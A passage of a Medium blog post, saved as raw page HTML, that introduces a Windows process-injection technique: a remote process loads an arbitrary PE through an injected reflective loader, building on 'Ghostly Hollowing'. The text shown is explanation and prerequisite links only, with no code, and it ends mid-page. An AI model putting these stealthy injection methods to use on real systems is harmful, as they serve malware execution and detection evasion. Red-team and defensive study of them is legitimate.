# https://captain-woof.medium.com/ghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0

<!DOCTYPE html><html lang="en" data-rh="lang"><body><div id="root"><div class="a b c"><a href="https://captain-woof.medium.com/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" rel="noopener follow"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="m"><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="ss" role="dialog" aria-modal="true" tabindex="-1"><div class="xo xp bi ed xq xr xs aq xt hd xu" aria-hidden="true" role="presentation"></div><div class="xv xq xw xx xy xo ed fk xz ya yb lp yc yd ye yf yg yh yi yj yk yl ac cv ym" aria-hidden="true"><div class="yn gy"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="gl gm gn go gp m"><div class="ac ci"><div class="cp bi gq gr gs gt"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw gz yo hb hc hd"></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><div><h1 id="88de" class="pw-post-title hj hk hl bg hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih ii ij ik il bl" data-testid="storyTitle" data-selectable-paragraph="">Ghostly Reflective PE Loader — how to make an existing remote process inject a PE in itself</h1><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac im in io ip iq ir is it iu iv iw"><div class="ac r iw"><div class="ac ix"><div><div class="bn" aria-describedby="3" aria-labelledby="3" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="https://captain-woof.medium.com/?source=post_page---byline--3b65f2083de0---------------------------------------" data-discover="true"><div class="m iy iz by ja jb"><div class="m fr"><img alt="Sohail Saha" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg"><div class="jc by m bz ca fw o jd gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="je ac r"><div class="ac r jf"><div class="ac r"><div><div class="bn" aria-describedby="4" aria-labelledby="4" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at jg" data-testid="authorName" rel="noopener follow" href="https://captain-woof.medium.com/?source=post_page---byline--3b65f2083de0---------------------------------------" data-discover="true">Sohail Saha</a></span></div></div></div></div><div class="jh bn"></div></div></div></span></div><div class="ac r ji"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">10 min read</span><div class="jj jk m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">Mar 11, 2025</span></div></span></div></div><div class="ac cw jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka"><div class="i l x fp fq r"><div class="kq m"><div class="ac r kr ks"><div class="pw-multi-vote-icon fr kt ku kv kw"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F3b65f2083de0&amp;operation=register&amp;redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&amp;user=Sohail+Saha&amp;userId=8e68869c881d&amp;source=---header_actions--3b65f2083de0---------------------clap_footer------------------" rel="noopener follow"><div><div class="bn" aria-describedby="5" aria-labelledby="5" role="tooltip"><div tabindex="-1" class="bf"><div class="kx aq ky kz la lb ao lc ld le kw" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m lf lg lh li lj lk ll"><p class="bg b ec ab eb"><span class="lm">--</span></p></div></div></div><div><div class="bn" aria-describedby="6" aria-labelledby="6" role="tooltip"><div tabindex="-1" class="bf"><button class="aq kx lp lq ac r fs lr ls" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lo"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bg b ec ab eb"><span class="pw-responses-count ln lo">1</span></p></button></div></div></div></div><div class="ac r kb kc kd ke kf kg kh ki kj kk kl km kn ko kp"><div class="lt l k j e"></div><div class="i l"><div><div class="bn" aria-describedby="7" aria-labelledby="7" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F3b65f2083de0&amp;operation=register&amp;redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&amp;source=---header_actions--3b65f2083de0---------------------bookmark_footer------------------" rel="noopener follow"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk lv cu"><div class="m ag"><div class="ac ci"><div class="lw lx ly lz ma mb cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D3b65f2083de0&amp;operation=register&amp;redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&amp;source=---header_actions--3b65f2083de0---------------------post_audio_button------------------" rel="noopener follow"><div><div class="bn" aria-describedby="53" aria-labelledby="53" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an mc ap aq ar fe md me ls mf mg mh mi mj t mk ml mm mn mo mp mq v mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-describedby="9" aria-labelledby="9" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an mc ap aq ar fe md me ls mf mg mh mi mj t mk ml mm mn mo mp mq v mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><figure class="mx my mz na nb nc mu mv paragraph-image"><div role="button" tabindex="0" class="nd ne fr nf bi ng"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="mu mv mw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*peP_O41YLXg8G8P_sGjq3g.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*peP_O41YLXg8G8P_sGjq3g.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/1*peP_O41YLXg8G8P_sGjq3g.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/1*peP_O41YLXg8G8P_sGjq3g.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/1*peP_O41YLXg8G8P_sGjq3g.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/1*peP_O41YLXg8G8P_sGjq3g.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/1*peP_O41YLXg8G8P_sGjq3g.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1400/1*peP_O41YLXg8G8P_sGjq3g.jpeg 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mb nh c" width="700" height="360" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*peP_O41YLXg8G8P_sGjq3g.jpeg"></picture></div></div><figcaption class="ni fm nj mu mv nk nl bg b bh ab eb" data-selectable-paragraph="">Source: Marco Polo (TV series)</figcaption></figure><p id="bb3c" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">I was studying Reflective DLL injection, a technique where a loader DLL is injected into a remote process, which then loads itself (hence the name “reflective”), and runs its DllMain entrypoint.</p><p id="e75c" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">I wondered if I can instead inject an agnostic loader that doesn’t load itself, but rather any PE. Instead of directly mapping this PE into the remote process, what if the loader itself fetched it? That way, I could reuse my local PE loader, turn it into a remote PE loader.</p><h2 id="924a" class="ok ol hl bg om on oo op oq or os ot ou ov ow ox oy oz pa pb pc pd pe pf pg ph bl" data-selectable-paragraph="">Here’s the idea</h2><h3 id="d58b" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Prerequisites</h3><p id="6e67" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">My idea makes use of a few concepts that I wrote about before. I highly recommend going through them, because we will be combining these two:</p><ul class=""><li id="c0e7" class="nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj qc qd qe bl" data-selectable-paragraph=""><a class="ah qf" rel="noopener" href="https://captain-woof.medium.com/how-to-write-a-local-pe-loader-from-scratch-for-educational-purposes-30e10cd88abc" data-discover="true">Writing a local PE Loader from scratch (for educational purposes)</a></li><li id="5b95" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qc qd qe bl" data-selectable-paragraph=""><a class="ah qf" rel="noopener" href="https://captain-woof.medium.com/ghostly-hollowing-probably-the-most-bizarre-windows-process-injection-technique-i-know-bf833c96663a" data-discover="true">Ghostly Hollowing — probably the most bizarre Windows process injection technique I know</a></li></ul><p id="7a6b" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" data-selectable-paragraph="">In addition, you need to know a few Windows internals:</p><ul class=""><li id="aff4" class="nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj qc qd qe bl" data-selectable-paragraph="">Sections — <a class="ah qf" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views</a></li><li id="052b" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qc qd qe bl" data-selectable-paragraph="">stdcall — <a class="ah qf" href="https://learn.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170</a></li><li id="8040" class="nm nn hl no b np qg nr ns nt qh nv nw nx qi nz oa ob qj od oe of qk oh oi oj qc qd qe bl" data-selectable-paragraph="">fastcall — <a class="ah qf" href="https://learn.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170" rel="noopener ugc nofollow" target="_blank">https://learn.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170</a></li></ul><h3 id="bb6c" class="pi ol hl bg om pj pk ef oq pl pm eh ou nx pn po pp ob pq pr ps of pt pu pv pw bl" data-selectable-paragraph="">Ghostly Hollowing — pros and cons</h3><p id="0d5a" class="pw-post-body-paragraph nm nn hl no b np px nr ns nt py nv nw nx pz nz oa ob qa od oe of qb oh oi oj he bl" data-selectable-paragraph="">Ghostly Hollowing can only inject a PE into a newly created suspended process. It cannot inject into an already running process and keep its original threads going. It relies on patching the address of image base before the process gets a chance to resolve imports. That way, besides causing the loader to correctly resolve the injected PE’s imported functions, it also negates the need for relocations (owing to the patched base address). In addition, since the image is mapped with <code class="de ql qm qn qo b">SEC_IMAGE</code> , all the PE sections are correctly assigned their page protections.</p><p id="7235" class="pw-post-body-paragraph nm nn hl no b np nq nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj he bl" 